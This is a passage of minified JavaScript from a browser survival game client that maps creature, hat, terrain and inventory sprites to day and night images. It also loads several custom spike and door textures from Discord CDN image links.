                    sprite[ze.BABY_LAVA_WING_LEFT_ATTACK][ze.NIGHT] = IMAGES.BABY_LAVA_WING_LEFT_ATTACKN,
                    sprite[ze.BABY_LAVA_WING_RIGHT_ATTACK] = [],
                    sprite[ze.BABY_LAVA_WING_RIGHT_ATTACK][ze.DAY] = IMAGES.BABY_LAVA_WING_RIGHT_ATTACKD,
                    sprite[ze.BABY_LAVA_WING_RIGHT_ATTACK][ze.NIGHT] = IMAGES.BABY_LAVA_WING_RIGHT_ATTACKN,
                    sprite[ze.BABY_LAVA_WING_LEFT_TAMED] = [],
                    sprite[ze.BABY_LAVA_WING_LEFT_TAMED][ze.DAY] = IMAGES.BABY_LAVA_WING_LEFT_TAMEDD,
                    sprite[ze.BABY_LAVA_WING_LEFT_TAMED][ze.NIGHT] = IMAGES.BABY_LAVA_WING_LEFT_TAMEDN,
                    sprite[ze.BABY_LAVA_WING_RIGHT_TAMED] = [],
                    sprite[ze.BABY_LAVA_WING_RIGHT_TAMED][ze.DAY] = IMAGES.BABY_LAVA_WING_RIGHT_TAMEDD,
                    sprite[ze.BABY_LAVA_WING_RIGHT_TAMED][ze.NIGHT] = IMAGES.BABY_LAVA_WING_RIGHT_TAMEDN,
                    sprite[ze.HURT_BABY_LAVA] = IMAGES.HURT_BABY_LAVA,
                    sprite[ze.HURT_BABY_LAVA_WING_LEFT] = IMAGES.HURT_BABY_LAVA_WING_LEFT,
                    sprite[ze.HURT_BABY_LAVA_WING_RIGHT] = IMAGES.HURT_BABY_LAVA_WING_RIGHT,
                    sprite[ze.HAWK_ATTACK] = [],
                    sprite[ze.HAWK_ATTACK][ze.DAY] = IMAGES.HAWK_ATTACKD,
                    sprite[ze.HAWK_ATTACK][ze.NIGHT] = IMAGES.HAWK_ATTACKN,
                    sprite[ze.HAWK] = [],
                    sprite[ze.HAWK][ze.DAY] = IMAGES.HAWKD,
                    sprite[ze.HAWK][ze.NIGHT] = IMAGES.HAWKN,
                    sprite[ze.HURT_HAWK_GROUND] = IMAGES.HURT_HAWK_GROUND,
                    sprite[ze.HAWK_GROUND] = [],
                    sprite[ze.HAWK_GROUND][ze.DAY] = IMAGES.HAWK_GROUNDD,
                    sprite[ze.HAWK_GROUND][ze.NIGHT] = IMAGES.HAWK_GROUNDN,
                    sprite[ze.HAWK_GROUND_ATTACK] = [],
                    sprite[ze.HAWK_GROUND_ATTACK][ze.DAY] = IMAGES.HAWK_GROUND_ATTACKD,
                    sprite[ze.HAWK_GROUND_ATTACK][ze.NIGHT] = IMAGES.HAWK_GROUND_ATTACKN,
                    sprite[ze.HAWK_TAMED] = [],
                    sprite[ze.HAWK_TAMED][ze.DAY] = IMAGES.HAWK_TAMEDD,
                    sprite[ze.HAWK_TAMED][ze.NIGHT] = IMAGES.HAWK_TAMEDN,
                    sprite[ze.HAWK_WING_LEFT] = [],
                    sprite[ze.HAWK_WING_LEFT][ze.DAY] = IMAGES.HAWK_WING_LEFTD,
                    sprite[ze.HAWK_WING_LEFT][ze.NIGHT] = IMAGES.HAWK_WING_LEFTN,
                    sprite[ze.HAWK_WING_RIGHT] = [],
                    sprite[ze.HAWK_WING_RIGHT][ze.DAY] = IMAGES.HAWK_WING_RIGHTD,
                    sprite[ze.HAWK_WING_RIGHT][ze.NIGHT] = IMAGES.HAWK_WING_RIGHTN,
                    sprite[ze.HAWK_WING_LEFT_ATTACK] = [],
                    sprite[ze.HAWK_WING_LEFT_ATTACK][ze.DAY] = IMAGES.HAWK_WING_LEFT_ATTACKD,
                    sprite[ze.HAWK_WING_LEFT_ATTACK][ze.NIGHT] = IMAGES.HAWK_WING_LEFT_ATTACKN,
                    sprite[ze.HAWK_WING_RIGHT_ATTACK] = [],
                    sprite[ze.HAWK_WING_RIGHT_ATTACK][ze.DAY] = IMAGES.HAWK_WING_RIGHT_ATTACKD,
                    sprite[ze.HAWK_WING_RIGHT_ATTACK][ze.NIGHT] = IMAGES.HAWK_WING_RIGHT_ATTACKN,
                    sprite[ze.HAWK_WING_LEFT_TAMED] = [],
                    sprite[ze.HAWK_WING_LEFT_TAMED][ze.DAY] = IMAGES.HAWK_WING_LEFT_TAMEDD,
                    sprite[ze.HAWK_WING_LEFT_TAMED][ze.NIGHT] = IMAGES.HAWK_WING_LEFT_TAMEDN,
                    sprite[ze.HAWK_WING_RIGHT_TAMED] = [],
                    sprite[ze.HAWK_WING_RIGHT_TAMED][ze.DAY] = IMAGES.HAWK_WING_RIGHT_TAMEDD,
                    sprite[ze.HAWK_WING_RIGHT_TAMED][ze.NIGHT] = IMAGES.HAWK_WING_RIGHT_TAMEDN,
                    sprite[ze.HURT_HAWK] = IMAGES.HURT_HAWK,
                    sprite[ze.HURT_HAWK_WING_LEFT] = IMAGES.HURT_HAWK_WING_LEFT,
                    sprite[ze.HURT_HAWK_WING_RIGHT] = IMAGES.HURT_HAWK_WING_RIGHT,
                    sprite[ze.VULTURE_ATTACK] = [],
                    sprite[ze.VULTURE_ATTACK][ze.DAY] = IMAGES.VULTURE_ATTACKD,
                    sprite[ze.VULTURE_ATTACK][ze.NIGHT] = IMAGES.VULTURE_ATTACKN,
                    sprite[ze.VULTURE] = [],
                    sprite[ze.VULTURE][ze.DAY] = IMAGES.VULTURED,
                    sprite[ze.VULTURE][ze.NIGHT] = IMAGES.VULTUREN,
                    sprite[ze.HURT_VULTURE_GROUND] = IMAGES.HURT_VULTURE_GROUND,
                    sprite[ze.VULTURE_GROUND] = [],
                    sprite[ze.VULTURE_GROUND][ze.DAY] = IMAGES.VULTURE_GROUNDD,
                    sprite[ze.VULTURE_GROUND][ze.NIGHT] = IMAGES.VULTURE_GROUNDN,
                    sprite[ze.VULTURE_GROUND_ATTACK] = [],
                    sprite[ze.VULTURE_GROUND_ATTACK][ze.DAY] = IMAGES.VULTURE_GROUND_ATTACKD,
                    sprite[ze.VULTURE_GROUND_ATTACK][ze.NIGHT] = IMAGES.VULTURE_GROUND_ATTACKN,
                    sprite[ze.VULTURE_TAMED] = [],
                    sprite[ze.VULTURE_TAMED][ze.DAY] = IMAGES.VULTURE_TAMEDD,
                    sprite[ze.VULTURE_TAMED][ze.NIGHT] = IMAGES.VULTURE_TAMEDN,
                    sprite[ze.VULTURE_WING_LEFT] = [],
                    sprite[ze.VULTURE_WING_LEFT][ze.DAY] = IMAGES.VULTURE_WING_LEFTD,
                    sprite[ze.VULTURE_WING_LEFT][ze.NIGHT] = IMAGES.VULTURE_WING_LEFTN,
                    sprite[ze.VULTURE_WING_RIGHT] = [],
                    sprite[ze.VULTURE_WING_RIGHT][ze.DAY] = IMAGES.VULTURE_WING_RIGHTD,
                    sprite[ze.VULTURE_WING_RIGHT][ze.NIGHT] = IMAGES.VULTURE_WING_RIGHTN,
                    sprite[ze.VULTURE_WING_LEFT_ATTACK] = [],
                    sprite[ze.VULTURE_WING_LEFT_ATTACK][ze.DAY] = IMAGES.VULTURE_WING_LEFT_ATTACKD,
                    sprite[ze.VULTURE_WING_LEFT_ATTACK][ze.NIGHT] = IMAGES.VULTURE_WING_LEFT_ATTACKN,
                    sprite[ze.VULTURE_WING_RIGHT_ATTACK] = [],
                    sprite[ze.VULTURE_WING_RIGHT_ATTACK][ze.DAY] = IMAGES.VULTURE_WING_RIGHT_ATTACKD,
                    sprite[ze.VULTURE_WING_RIGHT_ATTACK][ze.NIGHT] = IMAGES.VULTURE_WING_RIGHT_ATTACKN,
                    sprite[ze.VULTURE_WING_LEFT_TAMED] = [],
                    sprite[ze.VULTURE_WING_LEFT_TAMED][ze.DAY] = IMAGES.VULTURE_WING_LEFT_TAMEDD,
                    sprite[ze.VULTURE_WING_LEFT_TAMED][ze.NIGHT] = IMAGES.VULTURE_WING_LEFT_TAMEDN,
                    sprite[ze.VULTURE_WING_RIGHT_TAMED] = [],
                    sprite[ze.VULTURE_WING_RIGHT_TAMED][ze.DAY] = IMAGES.VULTURE_WING_RIGHT_TAMEDD,
                    sprite[ze.VULTURE_WING_RIGHT_TAMED][ze.NIGHT] = IMAGES.VULTURE_WING_RIGHT_TAMEDN,
                    sprite[ze.HURT_VULTURE] = IMAGES.HURT_VULTURE,
                    sprite[ze.HURT_VULTURE_WING_LEFT] = IMAGES.HURT_VULTURE_WING_LEFT,
                    sprite[ze.HURT_VULTURE_WING_RIGHT] = IMAGES.HURT_VULTURE_WING_RIGHT,
                    sprite[ze.BOAR] = [],
                    sprite[ze.BOAR][ze.DAY] = IMAGES.BOARD,
                    sprite[ze.BOAR][ze.NIGHT] = IMAGES.BOARN,
                    sprite[ze.BOAR_TAMED] = [],
                    sprite[ze.BOAR_TAMED][ze.DAY] = IMAGES.BOAR_TAMEDD,
                    sprite[ze.BOAR_TAMED][ze.NIGHT] = IMAGES.BOAR_TAMEDN,
                    sprite[ze.BOAR_ATTACK] = [],
                    sprite[ze.BOAR_ATTACK][ze.DAY] = IMAGES.BOAR_ANGRYD,
                    sprite[ze.BOAR_ATTACK][ze.NIGHT] = IMAGES.BOAR_ANGRYN,
                    sprite[ze.BOAR_STEP] = [],
                    sprite[ze.BOAR_STEP][ze.DAY] = IMAGES.BOAR_STEP,
                    sprite[ze.BOAR_STEP][ze.NIGHT] = IMAGES.BOAR_STEP,
                    sprite[ze.CRAB_STEP] = [],
                    sprite[ze.CRAB_STEP][ze.DAY] = IMAGES.CRAB_STEP,
                    sprite[ze.CRAB_STEP][ze.NIGHT] = IMAGES.CRAB_STEP,
                    sprite[ze.BABY_MAMMOTH_STEP] = [],
                    sprite[ze.BABY_MAMMOTH_STEP][ze.DAY] = IMAGES.BABY_MAMMOTH_STEP,
                    sprite[ze.BABY_MAMMOTH_STEP][ze.NIGHT] = IMAGES.BABY_MAMMOTH_STEP,
                    sprite[ze.HURT_BOAR] = IMAGES.HURT_BOAR,
                    sprite[ze.SADDLE] = [],
                    sprite[ze.SADDLE][ze.DAY] = IMAGES.SADDLED,
                    sprite[ze.SADDLE][ze.NIGHT] = IMAGES.SADDLEN,
                    sprite[ze.WAND1] = [],
                    sprite[ze.WAND1][ze.DAY] = IMAGES.WAND1D,
                    sprite[ze.WAND1][ze.NIGHT] = IMAGES.WAND1N,
                    sprite[ze.SPELL] = [],
                    sprite[ze.SPELL][ze.DAY] = [IMAGES.LIGHT_WAND0D, IMAGES.LIGHT_WAND1D, IMAGES.WOOD_ARROWD, IMAGES.STONE_ARROWD, IMAGES.GOLD_ARROWD, IMAGES.DIAMOND_ARROWD, IMAGES.AMETHYST_ARROWD, IMAGES.REIDITE_ARROWD, IMAGES.DRAGON_ARROWD],
                    sprite[ze.SPELL][ze.NIGHT] = [IMAGES.LIGHT_WAND0N, IMAGES.LIGHT_WAND1N, IMAGES.WOOD_ARROWN, IMAGES.STONE_ARROWN, IMAGES.GOLD_ARROWN, IMAGES.DIAMOND_ARROWN, IMAGES.AMETHYST_ARROWN, IMAGES.REIDITE_ARROWD, IMAGES.DRAGON_ARROWN],
                    sprite[ze.WAND2] = [],
                    sprite[ze.WAND2][ze.DAY] = IMAGES.WAND2D,
                    sprite[ze.WAND2][ze.NIGHT] = IMAGES.WAND2N,
                    sprite[ze.BOAT_WAVE] = [],
                    sprite[ze.BOAT_WAVE][ze.DAY] = IMAGES.BOAT_WAVED,
                    sprite[ze.BOAT_WAVE][ze.NIGHT] = IMAGES.BOAT_WAVEN,
                    sprite[ze.SLED_WAVE] = [],
                    sprite[ze.SLED_WAVE][ze.DAY] = IMAGES.SLED_WAVED,
                    sprite[ze.SLED_WAVE][ze.NIGHT] = IMAGES.SLED_WAVEN,
                    sprite[ze.PIRATE_HAT] = [],
                    sprite[ze.PIRATE_HAT][ze.DAY] = IMAGES.PIRATE_HATD,
                    sprite[ze.PIRATE_HAT][ze.NIGHT] = IMAGES.PIRATE_HATN,
                    sprite[ze.FUR_HAT] = [],
                    sprite[ze.FUR_HAT][ze.DAY] = IMAGES.FUR_HATD,
                    sprite[ze.FUR_HAT][ze.NIGHT] = IMAGES.FUR_HATN,
                    sprite[ze.FLOWER_HAT] = [],
                    sprite[ze.FLOWER_HAT][ze.DAY] = IMAGES.FLOWER_HATD,
                    sprite[ze.FLOWER_HAT][ze.NIGHT] = IMAGES.FLOWER_HATN,
                    sprite[ze.PILOT_HELMET] = [],
                    sprite[ze.PILOT_HELMET][ze.DAY] = IMAGES.PILOT_HELMETD,
                    sprite[ze.PILOT_HELMET][ze.NIGHT] = IMAGES.PILOT_HELMETN,
                    sprite[ze.LAKE_EDGE] = [],
                    sprite[ze.LAKE_EDGE][ze.DAY] = [],
                    sprite[ze.LAKE_EDGE][ze.NIGHT] = [],
                    sprite[ze.LAKE_EDGE][ze.DAY].push(IMAGES.LAKE0D_EDGE),
                    sprite[ze.LAKE_EDGE][ze.DAY].push(IMAGES.LAKE1D_EDGE),
                    sprite[ze.LAKE_EDGE][ze.DAY].push(IMAGES.LAKE2D_EDGE),
                    sprite[ze.LAKE_EDGE][ze.NIGHT].push(IMAGES.LAKE0N_EDGE),
                    sprite[ze.LAKE_EDGE][ze.NIGHT].push(IMAGES.LAKE1N_EDGE),
                    sprite[ze.LAKE_EDGE][ze.NIGHT].push(IMAGES.LAKE2N_EDGE),
                    sprite[ze.LAKE_DEEP] = [],
                    sprite[ze.LAKE_DEEP][ze.DAY] = [],
                    sprite[ze.LAKE_DEEP][ze.NIGHT] = [],
                    sprite[ze.LAKE_DEEP][ze.DAY].push(IMAGES.LAKE0D_DEEP),
                    sprite[ze.LAKE_DEEP][ze.DAY].push(IMAGES.LAKE1D_DEEP),
                    sprite[ze.LAKE_DEEP][ze.DAY].push(IMAGES.LAKE2D_DEEP),
                    sprite[ze.LAKE_DEEP][ze.NIGHT].push(IMAGES.LAKE0N_DEEP),
                    sprite[ze.LAKE_DEEP][ze.NIGHT].push(IMAGES.LAKE1N_DEEP),
                    sprite[ze.LAKE_DEEP][ze.NIGHT].push(IMAGES.LAKE2N_DEEP),
                    sprite[ze.LAKE] = [],
                    sprite[ze.LAKE][ze.DAY] = [],
                    sprite[ze.LAKE][ze.NIGHT] = [],
                    sprite[ze.LAKE][ze.DAY].push(IMAGES.LAKE0D),
                    sprite[ze.LAKE][ze.DAY].push(IMAGES.LAKE1D),
                    sprite[ze.LAKE][ze.DAY].push(IMAGES.LAKE2D),
                    sprite[ze.LAKE][ze.NIGHT].push(IMAGES.LAKE0N),
                    sprite[ze.LAKE][ze.NIGHT].push(IMAGES.LAKE1N),
                    sprite[ze.LAKE][ze.NIGHT].push(IMAGES.LAKE2N),
                    sprite[1e4] = [new Image],
                    sprite[10001] = [new Image],
                    sprite[10002] = [new Image],
                    sprite[10003] = [new Image],
                    sprite[10004] = [new Image],
                    sprite[10005] = [new Image],
                    sprite[10006] = [new Image],
                    sprite[10007] = [new Image],
                    sprite[10008] = [new Image],
                    sprite[10009] = [new Image],
                    sprite[10010] = [new Image],
                    sprite[10011] = [new Image],
                    sprite[10012] = [new Image],
                    sprite[10013] = [new Image],
                    sprite[10014] = [new Image],
                    sprite[10015] = [new Image],
                    sprite[10016] = [new Image],
                    sprite[10017] = [new Image],
                    sprite[10018] = [new Image],
                    sprite[10019] = [new Image],
                    sprite[10020] = [new Image],
                    sprite[10021] = [new Image],
                    sprite[10022] = [new Image],
                    sprite[10023] = [new Image],
                    sprite[10024] = [new Image],
                    sprite[10025] = [new Image],
                    sprite[10026] = [new Image],
                    sprite[10027] = [new Image],
                    sprite[10028] = [new Image],
                    sprite[10029] = [new Image],
                    sprite[10030] = [new Image],
                    sprite[10031] = [new Image],
                    sprite[10032] = [new Image],
                    sprite[10033] = [new Image],
                    sprite[10034] = [new Image],
                    sprite[10035] = [new Image],
                    sprite[1e4][0].src = "https://cdn.discordapp.com/attachments/936607946018803835/938509274953420891/42341413241234.png",
                    sprite[10001][0].src = "https://cdn.discordapp.com/attachments/936607946018803835/936608248411336774/spike_reid321ite.png",
                    sprite[10002][0].src = "https://cdn.discordapp.com/attachments/936607946018803835/938509110230536324/spike_rei312312312312dite.png",
                    sprite[10003][0].src = "https://cdn.discordapp.com/attachments/936607946018803835/936608248180658196/spike_reid321231232131231ite.png",
                    sprite[10004][0].src = "https://cdn.discordapp.com/attachments/936607946018803835/938509109970493460/spike_r123123123124123eidite.png",
                    sprite[10005][0].src = "https://cdn.discordapp.com/attachments/936607946018803835/936608247949979688/spike_reid321231ite.png",
                    sprite[10006][0].src = "https://cdn.discordapp.com/attachments/936607946018803835/938509110490579054/spike_reid12312312312ite.png",
                    sprite[10007][0].src = "https://cdn.discordapp.com/attachments/936607946018803835/936608247731879997/4123.png",
                    sprite[10008][0].src = "https://cdn.discordapp.com/attachments/936607946018803835/938509110972928022/spike_reidit123123213123e.png",
                    sprite[10009][0].src = "https://cdn.discordapp.com/attachments/936607946018803835/936608247517954068/spike_12312312312312312.png",
                    sprite[10010][0].src = "https://cdn.discordapp.com/attachments/936607946018803835/938509110725447700/spike_reidit2312312312e.png",
                    sprite[10011][0].src = "https://cdn.discordapp.com/attachments/936607946018803835/936608247299854357/2312312312312312312.png",
                    sprite[10012][0].src = "https://cdn.discordapp.com/attachments/936612174263111681/936614994806710342/door_wo213123123123od.png",
                    sprite[10013][0].src = "https://cdn.discordapp.com/attachments/936612174263111681/936614908697665566/door_w3123123123ood.png",
                    sprite[10014][0].src = "https://cdn.discordapp.com/attachments/936612174263111681/936614994534092880/door_3123123123123.png",
                    sprite[10015][0].src = "https://cdn.discordapp.com/attachments/936612174263111681/936614908374687754/23213123123123.png",
                    sprite[10016][0].src = "https://cdn.discordapp.com/attachments/936612174263111681/936614994169184267/312312312.png",
                    sprite[10017][0].src = "https://cdn.discordapp.com/attachments/936612174263111681/936614908131409930/door_123312312312321312.png",
                    sprite[10018][0].src = "https://cdn.discordapp.com/attachments/936612174263111681/936614993858789486/door_diamo312312312nd.png",
                    sprite[10019][0].src = "https://cdn.discordapp.com/attachments/936612174263111681/936614907900735539/door_dia3123123123mond.png",
                    sprite[10020][0].src = "https://cdn.discordapp.com/attachments/936612174263111681/936614993506476052/door_amet2hyst.png",
                    sprite[10021][0].src = "https://cdn.discordapp.com/attachments/936612174263111681/936614907661664276/door_amethy1st.png",
                    sprite[10022][0].src = "https://cdn.discordapp.com/attachments/936612174263111681/936614993187700766/door_43423421414324.png",
                    sprite[10023][0].src = "https://cdn.discordapp.com/attachments/936612174263111681/936614907456151572/door_12312312312321321.png",
                    sprite[10024][0].src = "https://cdn.discordapp.com/attachments/936609104489771008/936612068155596820/spike_amethy12312312st.png",
                    sprite[10025][0].src = "https://cdn.discordapp.com/attachments/936609104489771008/936611884927430686/spike_ameth421341234yst.png",
                    sprite[10026][0].src = "https://cdn.discordapp.com/attachments/936609104489771008/936612067660673064/spike_am2131324ethyst.png",
                    sprite[10027][0].src = "https://cdn.discordapp.com/attachments/936609104489771008/936611884642230312/spike_amethyst.p31231231sd.png",
                    sprite[10028][0].src = "https://cdn.discordapp.com/attachments/936609104489771008/936612067283189770/spike_amet4134123412hyst.png",
                    sprite[10029][0].src = "https://cdn.discordapp.com/attachments/936609104489771008/936611884390563880/spike_ameth123123123yst.png",
                    sprite[10030][0].src = "https://cdn.discordapp.com/attachments/936609104489771008/936612066872139856/spike_3423412342314123.png",
                    sprite[10031][0].src = "https://cdn.discordapp.com/attachments/936609104489771008/936611884180836392/spike_amethyst123123123.png",
                    sprite[10032][0].src = "https://cdn.discordapp.com/attachments/936609104489771008/936612066524037180/312312312amethyst.png",
                    sprite[10033][0].src = "https://cdn.discordapp.com/attachments/936609104489771008/936611883941785631/spike_amet12312312hyst.png",
                    sprite[10034][0].src = "https://cdn.discordapp.com/attachments/936609104489771008/936612066171695164/spike_ameth12312312312yst.png",
                    sprite[10035][0].src = "https://cdn.discordapp.com/attachments/936609104489771008/936611883715264562/spike_amet1234hyst.png ",
                    sprite[1e4][1] = sprite[1e4][0],
                    sprite[10001][1] = sprite[10001][0],
                    sprite[10002][1] = sprite[10002][0],
                    sprite[10003][1] = sprite[10003][0],
                    sprite[10004][1] = sprite[10004][0],
                    sprite[10005][1] = sprite[10005][0],
                    sprite[10006][1] = sprite[10006][0],
                    sprite[10007][1] = sprite[10007][0],
                    sprite[10008][1] = sprite[10008][0],
                    sprite[10009][1] = sprite[10009][0],
                    sprite[10010][1] = sprite[10010][0],
                    sprite[10011][1] = sprite[10011][0],
                    sprite[10012][1] = sprite[10012][0],
                    sprite[10013][1] = sprite[10013][0],
                    sprite[10014][1] = sprite[10014][0],
                    sprite[10015][1] = sprite[10015][0],
                    sprite[10016][1] = sprite[10016][0],
                    sprite[10017][1] = sprite[10017][0],
                    sprite[10018][1] = sprite[10018][0],
                    sprite[10019][1] = sprite[10019][0],
                    sprite[10020][1] = sprite[10020][0],
                    sprite[10021][1] = sprite[10021][0],
                    sprite[10022][1] = sprite[10022][0],
                    sprite[10023][1] = sprite[10023][0],
                    sprite[10024][1] = sprite[10024][0],
                    sprite[10025][1] = sprite[10025][0],
                    sprite[10026][1] = sprite[10026][0],
                    sprite[10027][1] = sprite[10027][0],
                    sprite[10028][1] = sprite[10028][0],
                    sprite[10029][1] = sprite[10029][0],
                    sprite[10030][1] = sprite[10030][0],
                    sprite[10031][1] = sprite[10031][0],
                    sprite[10032][1] = sprite[10032][0],
                    sprite[10033][1] = sprite[10033][0],
                    sprite[10034][1] = sprite[10034][0],
                    sprite[10035][1] = sprite[10035][0],
                    MINIMAP_UTILS.g = [],
                    MINIMAP_UTILS.g[0] = [IMAGES.MAPDAY_GOLD1, IMAGES.MAPNIGHT_GOLD1],
                    MINIMAP_UTILS.g[1] = MINIMAP_UTILS.g[0],
                    MINIMAP_UTILS.g[2] = [IMAGES.MAPDAY_GOLD2, IMAGES.MAPNIGHT_GOLD2],
                    MINIMAP_UTILS.m = [],
                    MINIMAP_UTILS.m[0] = [IMAGES.MAPDAY_EMERALD1, IMAGES.MAPNIGHT_EMERALD1],
                    MINIMAP_UTILS.m[1] = MINIMAP_UTILS.m[0],
                    MINIMAP_UTILS.m[2] = [IMAGES.MAPDAY_EMERALD2, IMAGES.MAPNIGHT_EMERALD2],
                    MINIMAP_UTILS.la = [],
                    MINIMAP_UTILS.la[0] = [IMAGES.MAPDAY_MAGMA, IMAGES.MAPNIGHT_MAGMA],
                    MINIMAP_UTILS.la[1] = MINIMAP_UTILS.la[0],
                    MINIMAP_UTILS.la[2] = MINIMAP_UTILS.la[0],
                    MINIMAP_UTILS.la[3] = MINIMAP_UTILS.la[0],
                    MINIMAP_UTILS.la[4] = MINIMAP_UTILS.la[0],
                    MINIMAP_UTILS.la[5] = MINIMAP_UTILS.la[0],
                    MINIMAP_UTILS.s = [],
                    MINIMAP_UTILS.s[0] = [IMAGES.MAPDAY_STONE1, IMAGES.MAPNIGHT_STONE1],
                    MINIMAP_UTILS.s[1] = MINIMAP_UTILS.s[0],
                    MINIMAP_UTILS.s[2] = [IMAGES.MAPDAY_STONE2, IMAGES.MAPNIGHT_STONE2],
                    MINIMAP_UTILS.p = [],
                    MINIMAP_UTILS.p[0] = [IMAGES.MAPDAY_BERRY, IMAGES.MAPDAY_BERRY],
                    MINIMAP_UTILS.a = [],
                    MINIMAP_UTILS.a[0] = [IMAGES.MAPDAY_AMETHYST, IMAGES.MAPNIGHT_AMETHYST],
                    MINIMAP_UTILS.a[1] = MINIMAP_UTILS.a[0],
                    MINIMAP_UTILS.a[2] = MINIMAP_UTILS.a[0],
                    MINIMAP_UTILS.d = [],
                    MINIMAP_UTILS.d[0] = [IMAGES.MAPDAY_DIAMOND, IMAGES.MAPNIGHT_DIAMOND],
                    MINIMAP_UTILS.d[1] = MINIMAP_UTILS.d[0],
                    MINIMAP_UTILS.d[2] = MINIMAP_UTILS.d[0],
                    MINIMAP_UTILS.re = [],
                    MINIMAP_UTILS.re[0] = [IMAGES.MAPDAY_REIDITE, IMAGES.MAPNIGHT_REIDITE],
                    MINIMAP_UTILS.re[1] = MINIMAP_UTILS.re[0],
                    MINIMAP_UTILS.re[2] = MINIMAP_UTILS.re[0],
                    MINIMAP_UTILS.f = [],
                    MINIMAP_UTILS.f[0] = [IMAGES.MAPDAY_FIR_TREE, IMAGES.MAPNIGHT_FIR_TREE],
                    MINIMAP_UTILS.f[1] = MINIMAP_UTILS.f[0],
                    MINIMAP_UTILS.f[2] = MINIMAP_UTILS.f[0],
                    MINIMAP_UTILS.isl = [],
                    MINIMAP_UTILS.isl[0] = [IMAGES.MAPDAY_ISLAND, IMAGES.MAPNIGHT_ISLAND],
                    MINIMAP_UTILS.isl[1] = MINIMAP_UTILS.isl[0],
                    MINIMAP_UTILS.isl[2] = MINIMAP_UTILS.isl[0],
                    MINIMAP_UTILS.c = [],
                    MINIMAP_UTILS.c[0] = [IMAGES.MAPDAY_CACTUS, IMAGES.MAPNIGHT_CACTUS],
                    MINIMAP_UTILS.c[1] = MINIMAP_UTILS.c[0],
                    MINIMAP_UTILS.c[2] = MINIMAP_UTILS.c[0],
                    MINIMAP_UTILS.wtb = [],
                    MINIMAP_UTILS.wtb[0] = [IMAGES.MAPDAY_RIVER, IMAGES.MAPNIGHT_RIVER],
                    MINIMAP_UTILS.PIRANHA = [IMAGES.MAPDAY_PIRANHA, IMAGES.MAPNIGHT_PIRANHA],
                    MINIMAP_UTILS.KRAKEN = [IMAGES.MAPDAY_KRAKEN, IMAGES.MAPNIGHT_KRAKEN],
                    MINIMAP_UTILS.FOX = [IMAGES.MAPDAY_FOX, IMAGES.MAPNIGHT_FOX],
                    MINIMAP_UTILS.WOLF = [IMAGES.MAPDAY_WOLF, IMAGES.MAPNIGHT_WOLF],
                    MINIMAP_UTILS.SPIDER = [IMAGES.MAPDAY_SPIDER, IMAGES.MAPNIGHT_SPIDER],
                    MINIMAP_UTILS.BEAR = [IMAGES.MAPDAY_BEAR, IMAGES.MAPNIGHT_BEAR],
                    MINIMAP_UTILS.CAVE = [IMAGES.MAPDAY_CAVE, IMAGES.MAPNIGHT_CAVE],
                    MINIMAP_UTILS.MAP = [IMAGES.BIGDAY, IMAGES.BIGNIGHT],
                    MINIMAP_UTILS.FOREST = [IMAGES.MAPDAY_FOREST, IMAGES.MAPNIGHT_FOREST],
                    MINIMAP_UTILS.WINTER = [IMAGES.MAPDAY_WINTER, IMAGES.MAPNIGHT_WINTER],
                    MINIMAP_UTILS.DESERT = [IMAGES.MAPDAY_DESERT, IMAGES.MAPNIGHT_DESERT],
                    MINIMAP_UTILS.LAVA = [IMAGES.MAPDAY_LAVA, IMAGES.MAPNIGHT_LAVA],
                    MINIMAP_UTILS)
                    for (var n = MINIMAP_UTILS[e], r = 0; r < n.length; r++) {
                        var o = n[r];
                        if (void 0 !== o.tryLoad)
                            o.tryLoad();
                        else if (0 < o.length)
                            for (var a = 0; a < o.length; a++)
                                void 0 !== o[a].tryLoad && o[a].tryLoad()
                    }
                console.log("Load images", Date.now() - t)
            }
            function k0() {
                var e = (new Date).getTime();
                V0(),
                    sprite[ze.INV_PUMPKIN] = O(1, [{
                        f: C0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#352b10", "#c06937", "#cd733b", "#b25e34", "#244e2b", "#214224", "#6f4424", "#3c3009"]
                    }], .2, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CHEST_PUMPKIN] = sprite[ze.INV_PUMPKIN],
                    sprite[ze.INV_CARROT] = [],
                    sprite[ze.INV_CARROT][0] = IMAGES.INV_CARROT_OUT,
                    sprite[ze.INV_CARROT][1] = IMAGES.INV_CARROT_IN,
                    sprite[ze.INV_CARROT][2] = IMAGES.INV_CARROT_CLICK,
                    sprite[ze.CHEST_CARROT] = sprite[ze.INV_CARROT],
                    sprite[ze.INV_WATERMELON] = [],
                    sprite[ze.INV_WATERMELON][0] = IMAGES.INV_WATERMELON_OUT,
                    sprite[ze.INV_WATERMELON][1] = IMAGES.INV_WATERMELON_IN,
                    sprite[ze.INV_WATERMELON][2] = IMAGES.INV_WATERMELON_CLICK,
                    sprite[ze.CHEST_WATERMELON] = sprite[ze.INV_WATERMELON],
                    sprite[ze.INV_ALOE_VERA] = [],
                    sprite[ze.INV_ALOE_VERA][0] = IMAGES.INV_ALOE_VERA_OUT,
                    sprite[ze.INV_ALOE_VERA][1] = IMAGES.INV_ALOE_VERA_IN,
                    sprite[ze.INV_ALOE_VERA][2] = IMAGES.INV_ALOE_VERA_CLICK,
                    sprite[ze.CHEST_ALOE_VERA] = sprite[ze.INV_ALOE_VERA],
                    sprite[ze.INV_CACTUS] = [],
                    sprite[ze.INV_CACTUS][0] = IMAGES.INV_CACTUS_OUT,
                    sprite[ze.INV_CACTUS][1] = IMAGES.INV_CACTUS_IN,
                    sprite[ze.INV_CACTUS][2] = IMAGES.INV_CACTUS_CLICK,
                    sprite[ze.CHEST_CACTUS] = sprite[ze.INV_CACTUS],
                    sprite[ze.INV_TOMATO] = [],
                    sprite[ze.INV_TOMATO][0] = IMAGES.INV_TOMATO_OUT,
                    sprite[ze.INV_TOMATO][1] = IMAGES.INV_TOMATO_IN,
                    sprite[ze.INV_TOMATO][2] = IMAGES.INV_TOMATO_CLICK,
                    sprite[ze.CHEST_TOMATO] = sprite[ze.INV_TOMATO],
                    sprite[ze.INV_BOAT] = [],
                    sprite[ze.INV_BOAT][0] = IMAGES.INV_BOAT_OUT,
                    sprite[ze.INV_BOAT][1] = IMAGES.INV_BOAT_IN,
                    sprite[ze.INV_BOAT][2] = IMAGES.INV_BOAT_CLICK,
                    sprite[ze.CHEST_BOAT] = sprite[ze.INV_BOAT],
                    sprite[ze.CRAFT_BOAT] = sprite[ze.INV_BOAT],
                    sprite[ze.INV_MACHETE] = [],
                    sprite[ze.INV_MACHETE][0] = IMAGES.INV_MACHETE_OUT,
